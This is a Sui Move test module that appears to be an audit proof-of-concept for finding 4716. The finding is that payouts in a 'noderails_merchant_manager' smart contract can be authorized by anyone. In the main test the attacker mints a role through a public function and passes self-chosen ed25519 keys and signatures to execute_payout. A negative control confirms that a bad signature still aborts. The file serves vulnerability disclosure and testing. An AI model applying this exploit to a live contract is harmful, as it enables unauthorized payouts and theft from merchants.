#[test_only]
/// Audit PoC for finding 4716: merchant_manager payout authorization fully bypassable.
///
/// `config::create_role` is public and `require_exec_authorized` only checks the u8 role byte,
/// so an attacker can mint a RoleRecord with `transaction_key()`. The ed25519 verification
/// public keys in `execute_payout` are caller-supplied and `MerchConfig` stores no authorized
/// key set, so the attacker supplies their own keys + signatures.
module noderails_merchant_manager::audit_poc_tests;

use noderails_merchant_manager::config;
use noderails_merchant_manager::payout;
use sui::clock::Clock;
use sui::coin::{Self, Coin};
use sui::event;
use sui::sui::SUI;
use sui::test_scenario::{Self as ts};

const MERCHANT: address = @0x1111;
const RECIPIENT: address = @0x2222;
const CALLER: address = @0x3333; // arbitrary attacker address — never auth-checked
const SUPER_ADMIN: address = @0x4444;

const AMOUNT: u64 = 1_000_000_000;
const SESSION_EXPIRY_MS: u64 = 0xFFFF_FFFF_FFFF_FFFF;

/// Ed25519 keypair generated off-chain; signs the session message
/// `NodeRailsMerchantManager::Session:v1 || addr(MERCHANT) || u64_le(SESSION_EXPIRY_MS)`.
const SESSION_PK: vector<u8> =
    x"79b5562e8fe654f94078b112e8a98ba7901f853ae695bed7e0e3910bad049664";
const SESSION_SIG: vector<u8> =
    x"af61161736df6df93bba338006c8b005c5bb1890967e94e03e39b73626f9427f9d3d4e8061eee3f9b060c5c445c06b48e54d52510e951f2e8147e9ee1749da0d";

/// Different ed25519 keypair signing the platform payout message
/// `NodeRailsMerchantManager::NoderailsPayoutCoin:v1 || PAYOUT_INTENT_ID || addr(MERCHANT)
///  || addr(RECIPIENT) || "0x0000...0002::sui::SUI" || u64_le(AMOUNT) || NONCE`.
const PLATFORM_PK: vector<u8> =
    x"43cdc023d22d5f9e107d1a0693457d35d1d10eb7d21c721192f56f5de40665d3";
const PLATFORM_SIG: vector<u8> =
    x"324020ef41512782bd60310189548abadfd61c089841a706611080aa674c449f3067153cab6c04edd249edde2a3a6b5a1d63bb01ebea509456e712bb10149a07";

const PAYOUT_INTENT_ID: vector<u8> =
    x"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";
const NONCE: vector<u8> =
    x"cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc";

#[test]
fun poc_4716_attacker_forges_role_and_calls_execute_payout() {
    // ---- Tx 0: super_admin publishes config + nonce registry ----
    let mut scenario = ts::begin(SUPER_ADMIN);
    scenario.create_system_objects(); // shares the Clock
    payout::initialize(SUPER_ADMIN, scenario.ctx());

    // ---- Tx 1: attacker (CALLER) forges a RoleRecord via public create_role ----
    scenario.next_tx(CALLER);
    // Bug #1: create_role is public and require_exec_authorized only validates a u8 byte.
    // Anyone can mint a RoleRecord with role == transaction_key() (== 1).
    let role = config::create_role(config::transaction_key(), scenario.ctx());
    // Bug #2: caller-supplied public keys (SESSION_PK / PLATFORM_PK) are never checked against
    // any allowlist stored in MerchConfig — the config has no authorized-keys field at all.
    let coin = coin::mint_for_testing<SUI>(AMOUNT, scenario.ctx());

    let events_before = event::num_events();

    let mut clock = scenario.take_shared<Clock>();
    let mut nonce_reg = scenario.take_shared<payout::NonceRegistry>();
    let cfg = scenario.take_shared<config::MerchConfig>();

    payout::execute_payout<SUI>(
        &cfg,
        &role,
        &mut nonce_reg,
        &clock,
        PAYOUT_INTENT_ID,
        MERCHANT,
        RECIPIENT,
        coin,
        SESSION_EXPIRY_MS,
        SESSION_SIG,
        SESSION_PK,
        PLATFORM_SIG,
        PLATFORM_PK,
        NONCE,
        scenario.ctx(),
    );

    // The buggy call returned (otherwise this test aborts). Prove the impact: a PayoutExecuted
    // event was emitted by an attacker who controlled NO legitimate platform key.
    let events_after = event::num_events();
    assert!(events_after > events_before, 0);
    let payout_events = event::events_by_type<payout::PayoutExecuted>();
    assert!(payout_events.length() == 1, 1);

    // Cleanup: hand the forged role to the caller; the coin was already public_transfer'd inside.
    config::transfer_role(role, CALLER);
    ts::return_shared(cfg);
    ts::return_shared(nonce_reg);
    ts::return_shared(clock);

    scenario.end();
}

/// Negative control: a call WITHOUT a valid signature must abort. This proves the bug is
/// specifically the missing key-binding / role-binding — not that signatures are ignored.
#[test]
#[expected_failure(abort_code = 8)]
fun poc_4716_negative_control_bad_session_sig_aborts() {
    let mut scenario = ts::begin(SUPER_ADMIN);
    scenario.create_system_objects();
    payout::initialize(SUPER_ADMIN, scenario.ctx());

    scenario.next_tx(CALLER);
    let role = config::create_role(config::transaction_key(), scenario.ctx());
    let coin = coin::mint_for_testing<SUI>(AMOUNT, scenario.ctx());

    // Wrong signature (flipped last byte) — ed25519_verify returns false, abort with code 8.
    let bad_session_sig: vector<u8> = x"af61161736df6df93bba338006c8b005c5bb1890967e94e03e39b73626f9427f9d3d4e8061eee3f9b060c5c445c06b48e54d52510e951f2e8147e9ee1749da0e";

    // The shared objects are taken inside this block and consumed by the aborting call.
    {
        let mut clock = scenario.take_shared<Clock>();
        let mut nonce_reg = scenario.take_shared<payout::NonceRegistry>();
        let cfg = scenario.take_shared<config::MerchConfig>();

        payout::execute_payout<SUI>(
            &cfg,
            &role,
            &mut nonce_reg,
            &clock,
            PAYOUT_INTENT_ID,
            MERCHANT,
            RECIPIENT,
            coin,
            SESSION_EXPIRY_MS,
            bad_session_sig,
            SESSION_PK,
            PLATFORM_SIG,
            PLATFORM_PK,
            NONCE,
            scenario.ctx(),
        );

        ts::return_shared(cfg);
        ts::return_shared(nonce_reg);
        ts::return_shared(clock);
    };

    config::transfer_role(role, CALLER);
    scenario.end();
}
